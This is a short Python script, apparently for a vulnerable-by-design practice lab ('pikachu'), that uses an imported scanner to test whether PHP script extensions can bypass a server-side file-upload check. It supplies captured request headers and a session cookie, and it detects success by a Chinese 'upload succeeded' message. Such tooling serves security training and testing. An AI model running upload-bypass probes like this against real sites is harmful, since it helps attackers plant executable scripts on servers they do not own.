from checkUploadBypass import FileUploadScanner


burp0_url = "http://pikachu.com:80/vul/unsafeupload/servercheck.php"
burp0_cookies = {"PHPSESSID": "dkin7j81f93jkuov8vgvpsv85k"}
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://pikachu.com", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryAdFVTeDptugSPS8i", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://pikachu.com/vul/unsafeupload/servercheck.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}

multipart_data = {
    'MAX_FILE_SIZE': '100000',
    'submit': 'submit'
}

(FileUploadScanner(flag_str="文件上传成功")
 .check_script_extension("php",
                         burp0_url,
                         burp0_cookies,
                         burp0_headers,
                         multipart_data,
                         "uploadfile"))
